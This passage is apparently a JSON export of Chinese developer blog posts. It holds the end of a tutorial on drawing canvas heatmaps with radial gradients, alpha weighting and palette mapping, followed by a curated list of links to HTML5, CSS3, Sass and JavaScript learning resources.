class=\"hljs-string\"\u003e\"pixel\"\u003c/span\u003e: { //像素坐标\n      \u003cspan class=\"hljs-string\"\u003e\"x\"\u003c/span\u003e: 759,\n      \u003cspan class=\"hljs-string\"\u003e\"y\"\u003c/span\u003e: 439\n    }\n  },\n  ...\n]\n\u003c/code\u003e\u003c/pre\u003e\u003cp\u003e好了，我们得到转换后的像素坐标数据(x、y),就可以做下面的事情了。\u003c/p\u003e\n\u003ch3 class=\"heading\"\u003e创建 canvas 渐变填充\u003c/h3\u003e\n\u003cp\u003e创建一个由黑到白的渐变圆\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs bash\" lang=\"bash\"\u003e\u003cspan class=\"hljs-built_in\"\u003elet\u003c/span\u003e gradient = ctx.createRadialGradient(x, y, 0, x, y, radius);\ngradient.addColorStop(0, \u003cspan class=\"hljs-string\"\u003e'rgba(0,0,0,1)'\u003c/span\u003e);\ngradient.addColorStop(1, \u003cspan class=\"hljs-string\"\u003e'rgba(0,0,0,0)'\u003c/span\u003e);\nctx.fillStyle = gradient;\nctx.arc(x, y, radius, 0, Math.PI * 2, \u003cspan class=\"hljs-literal\"\u003etrue\u003c/span\u003e);\n\u003c/code\u003e\u003c/pre\u003e\u003cul\u003e\n\u003cli\u003ecreateRadialGradient() 创建线性的渐变对象\u003c/li\u003e\n\u003cli\u003eaddColorStop() 定义一个渐变的颜色带\u003c/li\u003e\n\u003c/ul\u003e\n\u003cp\u003e效果如图：\n\u003c/p\u003e\u003cfigure\u003e\u003cimg alt=\"image\" src=\"https://user-gold-cdn.xitu.io/2017/12/26/160909bd5ae9cb72?w=778\u0026amp;h=584\u0026amp;f=gif\u0026amp;s=3396994\"\u003e\u003cfigcaption\u003e\u003c/figcaption\u003e\u003c/figure\u003e\n那么问题就来了，如果每个数据权重值 count 不一样，我们该如何表示呢？\u003cp\u003e\u003c/p\u003e\n\u003ch3 class=\"heading\"\u003e设置 globalAlpha\u003c/h3\u003e\n\u003cp\u003e根据不同的count值设置不同的Alpha，假设最大的count的Alpha等于1，最小的count的Alpha为0，那么我根据count求出Alpha。\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs bash\" lang=\"bash\"\u003e\u003cspan class=\"hljs-built_in\"\u003elet\u003c/span\u003e alpha = (count - minValue) / (maxValue - minValue);\n\u003c/code\u003e\u003c/pre\u003e\u003cp\u003e然后我们代码如下：\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs bash\" lang=\"bash\"\u003edrawPoint(x, y, radius, alpha) {\n    \u003cspan class=\"hljs-built_in\"\u003elet\u003c/span\u003e ctx = this.ctx;\n    ctx.globalAlpha = alpha; //设置 Alpha 透明度\n    ctx.beginPath();\n    \u003cspan class=\"hljs-built_in\"\u003elet\u003c/span\u003e gradient = ctx.createRadialGradient(x, y, 0, x, y, radius);\n    gradient.addColorStop(0, \u003cspan class=\"hljs-string\"\u003e'rgba(0,0,0,1)'\u003c/span\u003e);\n    gradient.addColorStop(1, \u003cspan class=\"hljs-string\"\u003e'rgba(0,0,0,0)'\u003c/span\u003e);\n    ctx.fillStyle = gradient;\n    ctx.arc(x, y, radius, 0, Math.PI * 2, \u003cspan class=\"hljs-literal\"\u003etrue\u003c/span\u003e);\n    ctx.closePath();\n    ctx.fill();\n}\n\u003c/code\u003e\u003c/pre\u003e\u003cp\u003e效果跟上一个截图有很大区别，可以对比一下透明度的变化。\n\u003c/p\u003e\u003cfigure\u003e\u003cimg alt=\"image\" src=\"https://user-gold-cdn.xitu.io/2017/12/26/160909bd5b32d0dd?w=1634\u0026amp;h=1264\u0026amp;f=png\u0026amp;s=1408517\"\u003e\u003cfigcaption\u003e\u003c/figcaption\u003e\u003c/figure\u003e\n（这么黑乎乎的一团，跟热力差距好大啊）\u003cp\u003e\u003c/p\u003e\n\u003cp\u003e\u003c/p\u003e\u003cfigure\u003e\u003cimg alt=\"image\" src=\"https://user-gold-cdn.xitu.io/2017/12/26/160909bd53d6e276?w=253\u0026amp;h=172\u0026amp;f=png\u0026amp;s=70058\"\u003e\u003cfigcaption\u003e\u003c/figcaption\u003e\u003c/figure\u003e\u003cp\u003e\u003c/p\u003e\n\u003ch3 class=\"heading\"\u003e重置 canvas 画布颜色\u003c/h3\u003e\n\u003cul\u003e\n\u003cli\u003egetImageData() 复制画布上指定矩形的像素数据\u003c/li\u003e\n\u003cli\u003eputImageData() 将图像数据放回画布：\u003c/li\u003e\n\u003c/ul\u003e\n\u003cp\u003egetImageData()返回的数据格式如下：\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs bash\" lang=\"bash\"\u003e{\n  \u003cspan class=\"hljs-string\"\u003e\"data\"\u003c/span\u003e: {\n    \u003cspan class=\"hljs-string\"\u003e\"0\"\u003c/span\u003e: 0,   //R\n    \u003cspan class=\"hljs-string\"\u003e\"1\"\u003c/span\u003e: 128, //G\n    \u003cspan class=\"hljs-string\"\u003e\"2\"\u003c/span\u003e: 0,   //B\n    \u003cspan class=\"hljs-string\"\u003e\"3\"\u003c/span\u003e: 255, //Aplah\n    \u003cspan class=\"hljs-string\"\u003e\"4\"\u003c/span\u003e: 0, //R\n    \u003cspan class=\"hljs-string\"\u003e\"5\"\u003c/span\u003e: 128, //G\n    \u003cspan class=\"hljs-string\"\u003e\"6\"\u003c/span\u003e: 0,  //B\n    \u003cspan class=\"hljs-string\"\u003e\"7\"\u003c/span\u003e: 255, //Aplah\n    \u003cspan class=\"hljs-string\"\u003e\"8\"\u003c/span\u003e: 0,\n    \u003cspan class=\"hljs-string\"\u003e\"9\"\u003c/span\u003e: 128,\n    \u003cspan class=\"hljs-string\"\u003e\"10\"\u003c/span\u003e: 0,\n    \u003cspan class=\"hljs-string\"\u003e\"11\"\u003c/span\u003e: 255,\n    \u003cspan class=\"hljs-string\"\u003e\"12\"\u003c/span\u003e: 0,\n    \u003cspan class=\"hljs-string\"\u003e\"13\"\u003c/span\u003e: 128,\n    \u003cspan class=\"hljs-string\"\u003e\"14\"\u003c/span\u003e: 0,\n    \u003cspan class=\"hljs-string\"\u003e\"15\"\u003c/span\u003e: 255,\n    \u003cspan class=\"hljs-string\"\u003e\"16\"\u003c/span\u003e: 0,\n    \u003cspan class=\"hljs-string\"\u003e\"17\"\u003c/span\u003e: 128,\n    \u003cspan class=\"hljs-string\"\u003e\"18\"\u003c/span\u003e: 0,\n    \u003cspan class=\"hljs-string\"\u003e\"19\"\u003c/span\u003e: 255,\n    \u003cspan class=\"hljs-string\"\u003e\"20\"\u003c/span\u003e: 0,\n    \u003cspan class=\"hljs-string\"\u003e\"21\"\u003c/span\u003e: 128,\n    \u003cspan class=\"hljs-string\"\u003e\"22\"\u003c/span\u003e: 0\n    ...\n\u003c/code\u003e\u003c/pre\u003e\u003cp\u003e返回的数据是一维数组，每四个元素表示一个像素（rgba）值。\u003c/p\u003e\n\u003ch3 class=\"heading\"\u003e实现热力原理：读取每个像素的alpha值(透明度)，做一个颜色映射。\u003c/h3\u003e\n\u003cp\u003e代码如下：\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs js\" lang=\"js\"\u003e\u003cspan class=\"hljs-keyword\"\u003elet\u003c/span\u003e palette = \u003cspan class=\"hljs-keyword\"\u003ethis\u003c/span\u003e.getColorPaint(); \u003cspan class=\"hljs-comment\"\u003e//取色面板\u003c/span\u003e\n\u003cspan class=\"hljs-keyword\"\u003elet\u003c/span\u003e img = ctx.getImageData(\u003cspan class=\"hljs-number\"\u003e0\u003c/span\u003e, \u003cspan class=\"hljs-number\"\u003e0\u003c/span\u003e, container.width, container.height);\n    \u003cspan class=\"hljs-keyword\"\u003elet\u003c/span\u003e imgData = img.data;\n    \u003cspan class=\"hljs-keyword\"\u003elet\u003c/span\u003e max_opacity = normal.maxOpacity * \u003cspan class=\"hljs-number\"\u003e255\u003c/span\u003e;\n    \u003cspan class=\"hljs-keyword\"\u003elet\u003c/span\u003e min_opacity = normal.minOpacity * \u003cspan class=\"hljs-number\"\u003e255\u003c/span\u003e;\n    \u003cspan class=\"hljs-comment\"\u003e//权重区间\u003c/span\u003e\n    \u003cspan class=\"hljs-keyword\"\u003elet\u003c/span\u003e max_scope = (normal.maxScope \u0026gt; \u003cspan class=\"hljs-number\"\u003e1\u003c/span\u003e ? \u003cspan class=\"hljs-number\"\u003e1\u003c/span\u003e : normal.maxScope) * \u003cspan class=\"hljs-number\"\u003e255\u003c/span\u003e;\n    \u003cspan class=\"hljs-keyword\"\u003elet\u003c/span\u003e min_scope = (normal.minScope \u0026lt; \u003cspan class=\"hljs-number\"\u003e0\u003c/span\u003e ? \u003cspan class=\"hljs-number\"\u003e0\u003c/span\u003e : normal.minScope) * \u003cspan class=\"hljs-number\"\u003e255\u003c/span\u003e;\n    \u003cspan class=\"hljs-keyword\"\u003elet\u003c/span\u003e len = imgData.length;\n    \u003cspan class=\"hljs-keyword\"\u003efor\u003c/span\u003e (\u003cspan class=\"hljs-keyword\"\u003elet\u003c/span\u003e i = \u003cspan class=\"hljs-number\"\u003e3\u003c/span\u003e; i \u0026lt; len; i += \u003cspan class=\"hljs-number\"\u003e4\u003c/span\u003e) {\n        \u003cspan class=\"hljs-keyword\"\u003elet\u003c/span\u003e alpha = imgData[i]; \n        \u003cspan class=\"hljs-keyword\"\u003elet\u003c/span\u003e offset = alpha * \u003cspan class=\"hljs-number\"\u003e4\u003c/span\u003e;\n        \u003cspan class=\"hljs-keyword\"\u003eif\u003c/span\u003e (!offset) {\n            \u003cspan class=\"hljs-keyword\"\u003econtinue\u003c/span\u003e;\n        }\n        \u003cspan class=\"hljs-comment\"\u003e//映射颜色\u003c/span\u003e\n        imgData[i - \u003cspan class=\"hljs-number\"\u003e3\u003c/span\u003e] = palette[offset];\n        imgData[i - \u003cspan class=\"hljs-number\"\u003e2\u003c/span\u003e] = palette[offset + \u003cspan class=\"hljs-number\"\u003e1\u003c/span\u003e];\n        imgData[i - \u003cspan class=\"hljs-number\"\u003e1\u003c/span\u003e] = palette[offset + \u003cspan class=\"hljs-number\"\u003e2\u003c/span\u003e];\n\n        \u003cspan class=\"hljs-comment\"\u003e// 范围区间\u003c/span\u003e\n        \u003cspan class=\"hljs-keyword\"\u003eif\u003c/span\u003e (imgData[i] \u0026gt; max_scope) {\n            imgData[i] = \u003cspan class=\"hljs-number\"\u003e0\u003c/span\u003e;\n        }\n        \u003cspan class=\"hljs-keyword\"\u003eif\u003c/span\u003e (imgData[i] \u0026lt; min_scope) {\n            imgData[i] = \u003cspan class=\"hljs-number\"\u003e0\u003c/span\u003e;\n        }\n\n        \u003cspan class=\"hljs-comment\"\u003e// 透明度\u003c/span\u003e\n        \u003cspan class=\"hljs-keyword\"\u003eif\u003c/span\u003e (imgData[i] \u0026gt; max_opacity) {\n            imgData[i] = max_opacity;\n        }\n        \u003cspan class=\"hljs-keyword\"\u003eif\u003c/span\u003e (imgData[i] \u0026lt; min_opacity) {\n            imgData[i] = min_opacity;\n        }\n    }\n    \u003cspan class=\"hljs-comment\"\u003e//将设置后的像素数据放回画布\u003c/span\u003e\nctx.putImageData(img, \u003cspan class=\"hljs-number\"\u003e0\u003c/span\u003e, \u003cspan class=\"hljs-number\"\u003e0\u003c/span\u003e, \u003cspan class=\"hljs-number\"\u003e0\u003c/span\u003e, \u003cspan class=\"hljs-number\"\u003e0\u003c/span\u003e, container.width, container.height);\n\u003c/code\u003e\u003c/pre\u003e\u003cp\u003e创建颜色映射，一个好的颜色映射决定最终效果。\ninMap 创建一个长256px的调色面板：\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs bash\" lang=\"bash\"\u003e\u003cspan class=\"hljs-built_in\"\u003elet\u003c/span\u003e paletteCanvas = document.createElement(\u003cspan class=\"hljs-string\"\u003e'canvas'\u003c/span\u003e);\n\u003cspan class=\"hljs-built_in\"\u003elet\u003c/span\u003e paletteCtx = paletteCanvas.getContext(\u003cspan class=\"hljs-string\"\u003e'2d'\u003c/span\u003e);\npaletteCanvas.width = 256;\npaletteCanvas.height = 1;\n\u003cspan class=\"hljs-built_in\"\u003elet\u003c/span\u003e gradient = paletteCtx.createLinearGradient(0, 0, 256, 1);\n\u003c/code\u003e\u003c/pre\u003e\u003cp\u003einMap 默认颜色如下：\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs bash\" lang=\"bash\"\u003ethis.gradient = {\n    0.25: \u003cspan class=\"hljs-string\"\u003e'rgb(0,0,255)'\u003c/span\u003e,\n    0.55: \u003cspan class=\"hljs-string\"\u003e'rgb(0,255,0)'\u003c/span\u003e,\n    0.85: \u003cspan class=\"hljs-string\"\u003e'yellow'\u003c/span\u003e,\n    1.0: \u003cspan class=\"hljs-string\"\u003e'rgb(255,0,0)'\u003c/span\u003e\n};\n\u003c/code\u003e\u003c/pre\u003e\u003cp\u003e将gradient颜色设置到调色面板对象中\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs bash\" lang=\"bash\"\u003e\u003cspan class=\"hljs-keyword\"\u003efor\u003c/span\u003e (\u003cspan class=\"hljs-built_in\"\u003elet\u003c/span\u003e key \u003cspan class=\"hljs-keyword\"\u003ein\u003c/span\u003e gradient) {\n    gradient.addColorStop(key, gradientConfig[key]);\n}\n\u003c/code\u003e\u003c/pre\u003e\u003cp\u003e返回调色面板的像素点数据：\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs bash\" lang=\"bash\"\u003e\u003cspan class=\"hljs-built_in\"\u003ereturn\u003c/span\u003e paletteCtx.getImageData(0, 0, 256, 1).data;\n\u003c/code\u003e\u003c/pre\u003e\u003cp\u003e创建出来的调色面板效果图如下：（看起来像一个渐变颜色条）\u003c/p\u003e\n\u003cp\u003e\u003c/p\u003e\u003cfigure\u003e\u003cimg alt=\"image\" src=\"https://user-gold-cdn.xitu.io/2017/12/26/160909bd53eabc0d?w=472\u0026amp;h=30\u0026amp;f=png\u0026amp;s=15407\"\u003e\u003cfigcaption\u003e\u003c/figcaption\u003e\u003c/figure\u003e\u003cp\u003e\u003c/p\u003e\n\u003cp\u003e最终我们实现的热力图如下：\u003c/p\u003e\n\u003cp\u003e\u003c/p\u003e\u003cfigure\u003e\u003cimg alt=\"image\" src=\"https://user-gold-cdn.xitu.io/2017/12/26/160909bd7f642dca?w=1578\u0026amp;h=1234\u0026amp;f=png\u0026amp;s=1438477\"\u003e\u003cfigcaption\u003e\u003c/figcaption\u003e\u003c/figure\u003e\u003cp\u003e\u003c/p\u003e\n\u003ch3 class=\"heading\"\u003e下节预告\u003c/h3\u003e\n\u003cp\u003e下一节，我们将重点介绍 inMap 文字避让算法的实现。\u003c/p\u003e\n","buildTime":"1514893079.662","__v":0}
{"_id":{"$oid":"5a4b765a751bf823c002e926"},"id":"5a0c1956f265da430a501f51","author":{"$oid":"5a4b765a751bf823c002e90b"},"imageCache":[{"imageUrlArray":["https://user-gold-cdn.xitu.io/2017/11/15/15fbf43692119500?w=110\u0026h=112\u0026f=png\u0026s=14340","https://user-gold-cdn.xitu.io/2017/11/15/15fbf43677205fcd?w=111\u0026h=111\u0026f=png\u0026s=21413","https://user-gold-cdn.xitu.io/2017/11/15/15fbf436b488e241?w=109\u0026h=109\u0026f=png\u0026s=11196","https://user-gold-cdn.xitu.io/2017/11/15/15fbf43675e9f24e?w=111\u0026h=110\u0026f=png\u0026s=13657","https://user-gold-cdn.xitu.io/2017/11/15/15fbf4368566b3e8?w=110\u0026h=112\u0026f=png\u0026s=15201","https://user-gold-cdn.xitu.io/2017/11/15/15fbf4368734b834?w=107\u0026h=108\u0026f=png\u0026s=7119"],"screenShot":null}],"title":"个人分享--web前端学习资源分享","meta":{"likeCount":0},"tag":["JavaScript"],"comment":[],"shortContent":"时间过得真快，转眼间现在是2017年最后一个星期，而今天也是圣诞节，过几天也是元旦了。每到年底，大家都习惯总结和分享，我也不例外。但是经历，我之前已经发过了，那么我今天就分享吧！把我接触的一些资源分享给大家，算是送给大家的双旦礼物吧！希望大家能够从中获取自己所需的资源。从我接触…","content":"\u003cdiv\u003e\u003ch2\u003e1.前言\u003c/h2\u003e\u003cp\u003e时间过得真快，转眼间现在是2017年最后一个星期，而今天也是圣诞节，过几天也是元旦了。每到年底，大家都习惯总结和分享，我也不例外。但是经历，我之前已经发过了，那么我今天就分享吧！把我接触的一些资源分享给大家，算是送给大家的双旦礼物吧！希望大家能够从中获取自己所需的资源。从我接触前端的开始，到发稿时间截止的这段时间我看过很多的博客，开源项目也了解过一些，质量有参差不齐（甚至还出现过广告文，鸡汤文），但下面的推荐的博客，文章，项目或者其它资源都是我接触过的。不敢说资源最好，最全，适合每一个人，但是内容质量上让我满意的。可能有些资源我未必看完，看懂，看细。但我觉得是可以帮到大家的，能让大家提升技术水平的。希望能给大家起到一个引导，指路或者解惑的作用。如果大家有什么好的资源，也欢迎分享！\u003c/p\u003e\u003cblockquote\u003e\u003cp\u003e有一些资源链接，在后面我会加上括号的注释！比如：\u003ccode\u003e“\u003c/code\u003e \u003ca href=\"http://ued.ctrip.com/blog/5133.html\"\u003ehtml5推广\u003c/a\u003e（介绍html5开发的创意广告） \u003ccode\u003e”\u003c/code\u003e，加上注释的原因可能有以下几点： \u003cbr\u003e1.资源很不错，干货比较多，提醒大家看！\u003cbr\u003e2.资源是一个系列的其中一个资源。比如一个系列有20多篇文章，每一篇都有用，我不可能把20多篇链接都贴上，所以一般我贴这个系列的第一条，提醒大家不要忘记读完所在系列！\u003cbr\u003e3.资源里面的部分内容我个人觉得很有用，有部分我觉得没什么用！提醒大家挑着看，按需求看！\u003cbr\u003e4.资源的标题可能会有些小误导，或者资源的其它注意事项，我加以自己的解释和备注。\u003c/p\u003e\u003c/blockquote\u003e\u003ch2\u003e2.推荐文章（教程）\u003c/h2\u003e\u003ch3\u003ehtml(5)\u003c/h3\u003e\u003cp\u003e\u003ca href=\"http://tgideas.qq.com/webplat/info/news_version3/804/7104/7106/m5723/201506/354489.shtml\"\u003e后HTML5时代I\u003c/a\u003e\u003cbr\u003e\u003ca href=\"http://tgideas.qq.com/webplat/info/news_version3/804/7104/7106/m5723/201506/355023.shtml\"\u003e后HTML5时代II\u003c/a\u003e（简单粗暴的介绍html5的api，没什么废话）\u003cbr\u003e\u003ca href=\"http://ued.ctrip.com/blog/5133.html\"\u003ehtml5推广\u003c/a\u003e（介绍html5开发的创意广告）\u003cbr\u003e\u003ca href=\"https://juejin.im/post/595f41766fb9a06bc17c2c8d\"\u003e匠心打造canvas签名组件\u003c/a\u003e\u003cbr\u003e\u003ca href=\"http://www.cnblogs.com/TomXu/category/336175.html\"\u003eHTML5/CSS3\u003c/a\u003e（汤姆大叔总结的html5和css3的新特性）\u003cbr\u003e\u003ca href=\"https://isux.tencent.com/h5-animation-highway.html\"\u003eH5动画开发快车道\u003c/a\u003e\u003cbr\u003e\u003ca href=\"https://isux.tencent.com/h5-performance.html\"\u003e移动H5前端性能优化指南\u003c/a\u003e\u003cbr\u003e\u003ca href=\"http://www.tqtan.com/2015/01/31/play-with-h5/\"\u003e玩转HTML5移动页面\u003c/a\u003e\u003cbr\u003e\u003ca href=\"https://juejin.im/post/59598ecf5188250d8d141fff\"\u003eHTML5 进阶系列：文件上传下载\u003c/a\u003e\u003cbr\u003e\u003ca href=\"https://zhuanlan.zhihu.com/p/27052826\"\u003eHTML5 进阶系列：canvas 动态图表\u003c/a\u003e\u003cbr\u003e\u003ca href=\"https://zhuanlan.zhihu.com/p/26666141\"\u003eHTML5 进阶系列：拖放 API 实现拖放排序\u003c/a\u003e（这个系列的文章都不错，值得大家一看）\u003cbr\u003e\u003ca href=\"https://isux.tencent.com/h5active.html\"\u003eH5动效的常见制作手法\u003c/a\u003e\u003cbr\u003e\u003ca href=\"https://segmentfault.com/a/1190000010638325\"\u003e超多经典 canvas 实例，动态离子背景、移动炫彩小球、贪吃蛇、坦克大战、是男人就下100层、心形文字等等等\u003c/a\u003e\u003cbr\u003e\u003ca href=\"https://isux.tencent.com/canvas-particle-animation.html\"\u003e打造高大上的Canvas粒子动画\u003c/a\u003e\u003cbr\u003e\u003ca href=\"https://juejin.im/post/5a31dbc951882510b27563b9\"\u003ecanvas入门实战--邀请卡生成与下载\u003c/a\u003e\u003c/p\u003e\u003ch3\u003ecss(3)\u003c/h3\u003e\u003cp\u003e\u003ca href=\"http://www.w3cplus.com/resources/css3-tutorial-and-case\"\u003eCSS3属性教程与案例分享\u003c/a\u003e（大漠的CSS3干货，进去里面可以逐个看，对css3的学习很有用）\u003cbr\u003e\u003ca href=\"http://www.w3cplus.com/blog/163.html\"\u003eCSS3实现11种经典的CSS技术\u003c/a\u003e（大漠的CSS3经典实例干货，对css3的学习很有用）\u003cbr\u003e\u003ca href=\"http://www.w3cplus.com/w3cplusDemo/index.html\"\u003eW3cplus demo\u003c/a\u003e（w3cplus的案例，非常值得一看）\u003cbr\u003e\u003ca href=\"http://www.cnblogs.com/zhuzhenwei918/p/6120294.html\"\u003e强大的css3\u003c/a\u003e（概括性的说明css3的新特性的一篇文章）\u003cbr\u003e\u003ca href=\"http://www.cnblogs.com/lhb25/archive/2013/01/29/css3-rgba-tutorials.html\"\u003ecss3经典教程系列\u003c/a\u003e（不要忘记看完这个系列，文章都不错）\u003cbr\u003e\u003ca href=\"https://juejin.im/post/5a0c184c51882531926e4294\"\u003e个人总结（css3新特性）\u003c/a\u003e\u003cbr\u003e\u003ca href=\"https://juejin.im/post/5a0c175651882531ba107c4f\"\u003eCSS3热身实战--过渡与动画（实现炫酷下拉，手风琴，无缝滚动）\u003c/a\u003e\u003cbr\u003e\u003ca href=\"https://juejin.im/post/5a0c18196fb9a045023b2ddf\"\u003e编写自己的代码库(css3常用动画的实现)\u003c/a\u003e\u003cbr\u003e\u003ca href=\"https://juejin.im/post/5a121e4b6fb9a045076f41a3\"\u003e也许vue+css3做交互特效更简单\u003c/a\u003e\u003cbr\u003e\u003ca href=\"https://juejin.im/post/59c9ca9c6fb9a00a6b6e7e09\"\u003eCSS 写作建议和性能优化小结\u003c/a\u003e\u003cbr\u003e\u003ca href=\"http://www.cnblogs.com/nzbin/archive/2017/08/06/7073601.html\"\u003e如何编写轻量级 CSS 框架\u003c/a\u003e\u003cbr\u003e\u003ca href=\"http://caibaojian.com/css-protips.html\"\u003e21条CSS高级技巧\u003c/a\u003e\u003cbr\u003e\u003ca href=\"http://www.cnblogs.com/aaronjs/p/4744014.html\"\u003e原创：CSS3技术-雪碧图自适应缩放与精灵动画方案\u003c/a\u003e\u003cbr\u003e\u003ca href=\"http://www.ruanyifeng.com/blog/2015/07/flex-grammar.html\"\u003eFlex 布局教程：语法篇\u003c/a\u003e\u003cbr\u003e\u003ca href=\"http://www.ruanyifeng.com/blog/2015/07/flex-examples.html\"\u003eFlex 布局教程：实例篇\u003c/a\u003e\u003cbr\u003e\u003ca href=\"http://web.jobbole.com/91473/\"\u003e奇妙的 CSS shapes(CSS图形)\u003c/a\u003e\u003cbr\u003e\u003ca href=\"http://www.qdfuns.com/notes/25859/9e01e4cf0dd9b634744ff698af9fc8c1.html\"\u003e使用CSS3制作各种形状的图形（转自others）\u003c/a\u003e\u003cbr\u003e\u003ca href=\"http://web.jobbole.com/88197/\"\u003e有趣的CSS题目（1）： 左边竖条的实现方法\u003c/a\u003e（看了第一篇，可以往下面看，总会会帮助的，不过这个网站有时候加载不出图片，如果加载不出图片，放弃还是坚持，大家抓主意）\u003cbr\u003e\u003ca href=\"http://www.cnblogs.com/coco1s/p/7197662.html\"\u003e纯 CSS 实现波浪效果！\u003c/a\u003e\u003cbr\u003e\u003ca href=\"http://www.w3cplus.com/animation/check-css-animation-performance-with-the-browsers-dev-tools.html\"\u003e使用浏览器开发者工具检测CSS动画性能\u003c/a\u003e\u003cbr\u003e\u003ca href=\"http://imweb.io/topic/5643850eed18cc424277050e\"\u003e搞定这些疑难杂症，向css3动画说yes\u003c/a\u003e\u003cbr\u003e\u003ca href=\"http://yincheng.site/using-html-css-instead-of-js\"\u003eEffective前端1：能使用html/css解决的问题就不要使用JS\u003c/a\u003e\u003cbr\u003e\u003ca href=\"https://isux.tencent.com/native-animation.html\"\u003e如何让你的动画更自然\u003c/a\u003e\u003cbr\u003e\u003ca href=\"https://css-tricks.com/examples/ShapesOfCSS/\"\u003ecss画图形\u003c/a\u003e\u003cbr\u003e\u003ca href=\"https://tympanus.net/Development/CreativeLinkEffects/\"\u003ecss各种鼠标效果\u003c/a\u003e\u003cbr\u003e\u003ca href=\"https://www.ibm.com/developerworks/cn/web/1202_zhouxiang_css3/\"\u003e深入了解 CSS3 新特性\u003c/a\u003e（也是概括性的总结，这个系列值得推荐）\u003cbr\u003e\u003ca href=\"http://www.imweb.io/topic/55e32fd5771670e207a16bb9\"\u003e前端如何呼风唤雨\u003c/a\u003e\u003cbr\u003e\u003ca href=\"http://www.qdfuns.com/notes/40906/28abf71f9486e2cd86ae803e305b39fa.html\"\u003e:after和:before炫酷用法总结\u003c/a\u003e\u003cbr\u003e\u003ca href=\"http://web.jobbole.com/91586/\"\u003e神奇的 conic-gradient 圆锥渐变\u003c/a\u003e\u003cbr\u003e\u003ca href=\"http://web.jobbole.com/90964/?utm_source=blog.jobbole.com\u0026amp;utm_medium=relatedPosts\"\u003e10 个优质的 CSS 与 JS LOGO 动画示例\u003c/a\u003e\u003cbr\u003e\u003ca href=\"https://isux.tencent.com/emancipate-gpu.html\"\u003e被解放的GPU-提高CSS3性能\u003c/a\u003e\u003cbr\u003e\u003ca href=\"http://www.cnblogs.com/limingxi/p/3709322.html\"\u003e【项目总结】扯一扯电商网站前端css的整体架构设计（1）\u003c/a\u003e（看了第一篇，别忘了看下面的一个系列）\u003cbr\u003e\u003ca href=\"https://segmentfault.com/a/1190000010989110\"\u003e【整理】CSS布局方案\u003c/a\u003e\u003cbr\u003e\u003ca href=\"https://juejin.im/post/591873170ce4630069f3013d\"\u003ecss：默认的checkbox、input、radio太丑了？我来教你改变使用纯css3改写的带动画的默认样式\u003c/a\u003e\u003cbr\u003e\u003ca href=\"https://www.w3cplus.com/css/20-incredibly-useful-CSS-snippets-for-developers\"\u003e20个实用的CSS技巧代码\u003c/a\u003e\u003cbr\u003e\u003ca href=\"http://www.cnblogs.com/xiaoloulan/p/5801663.html\"\u003eCSS性能分析，如何优化CSS提高性能\u003c/a\u003e\u003cbr\u003e\u003ca href=\"https://segmentfault.com/a/1190000011354975\"\u003eCSS 黑魔法小技巧，让你少写不必要的JS，代码更优雅\u003c/a\u003e\u003cbr\u003e\u003ca href=\"https://www.w3cplus.com/animation/progressive-web-animation.html\"\u003e渐进式动画解决方案\u003c/a\u003e\u003cbr\u003e\u003ca href=\"https://www.w3cplus.com/css/css-future.html\"\u003eCSS新特性\u003c/a\u003e\u003cbr\u003e\u003ca href=\"https://www.w3cplus.com/animation/animation-performance.html\"\u003eCSS Animation性能优化\u003c/a\u003e\u003cbr\u003e\u003ca href=\"https://www.w3cplus.com/animation/high-performance-animation.html\"\u003e【转载】高性能的动画\u003c/a\u003e\u003cbr\u003e\u003ca href=\"http://www.cnblogs.com/coco1s/p/6992177.html\"\u003e奇妙的 CSS shapes(CSS图形)\u003c/a\u003e\u003cbr\u003e\u003c/p\u003e\u003cdiv\u003e\u003ch3\u003esass\u003c/h3\u003e\u003cp\u003e\u003ca href=\"http://www.ruanyifeng.com/blog/2012/06/sass.html\"\u003eSASS用法指南\u003c/a\u003e\u003cbr\u003e\u003ca href=\"https://www.w3cplus.com/preprocessor/8-tips-help-get-best-sass.html\"\u003e编写Sass的八个技巧\u003c/a\u003e\u003c/p\u003e\u003cdiv\u003e\u003cp\u003e\u003c/p\u003e\u003ch3\u003ejavascript\u003c/h3\u003e\u003cp\u003e\u003ca href=\"http://www.cnblogs.com/TomXu/archive/2011/12/15/2288411.html\"\u003e深入理解JavaScript系列\u003c/a\u003e（汤姆大叔写的JavaScript系列，涉及到各个知识点，对学习和深入js很有用）\u003cbr\u003e\u003ca href=\"http://web.jobbole.com/91737/\"\u003eJavaScript核心概念归纳整理\u003c/a\u003e（概括性的说明js的一些核心概念）\u003cbr\u003e\u003ca href=\"http://taobaofed.org/blog/2017/02/16/a-guide-to-api-design/\"\u003e从达标到卓越 —— API 设计之道\u003c/a\u003e\u003cbr\u003e\u003ca href=\"http://taobaofed.org/blog/2017/03/16/javascript-functional-programing/\"\u003e我眼中的 JavaScript 函数式编程\u003c/a\u003e\u003cbr\u003e\u003ca href=\"http://purplebamboo.github.io/2015/03/16/javascript-component/\"\u003ejavascript组件化\u003c/a\u003e\u003cbr\u003e\u003ca href=\"https://mp.weixin.qq.com/s?__biz=MzAxODE2MjM1MA==\u0026amp;mid=2651552444\u0026amp;idx=1\u0026amp;sn=2b0d4b47dd5f0377385b1d6390fa64b8\u0026amp;chksm=8025ad7db752246b20f2ae2929530966d8d1c53d0210ad190aa5eda38c1302f1f3b734671325\u0026amp;mpshare=1\u0026amp;scene=23\u0026amp;srcid=0809BXLS1CRKAj6CXYTasOJZ#rd\"\u003e如何写出小而清晰的函数？（JS 版）\u003c/a\u003e\u003cbr\u003e\u003ca href=\"https://segmentfault.com/a/1190000009704212\"\u003ejavascript对象详解：__proto__和prototype的区别和联系\u003c/a\u003e\u003cbr\u003e\u003ca href=\"https://segmentfault.com/a/1190000004282206\"\u003e理清javascript中的面向对象（一）——原型继承\u003c/a\u003e（这个专栏（实用至上）文章质量不错，值得留意）\u003cbr\u003e\u003ca href=\"http://www.w3cvip.com/425.html\"\u003e微前端-Javascript常用的设计模式详解\u003c/a\u003e\u003cbr\u003e\u003ca href=\"https://segmentfault.com/a/1190000000320102\"\u003e10 个你需要了解的最佳 javascript 开发实践\u003c/a\u003e\u003cbr\u003e\u003ca 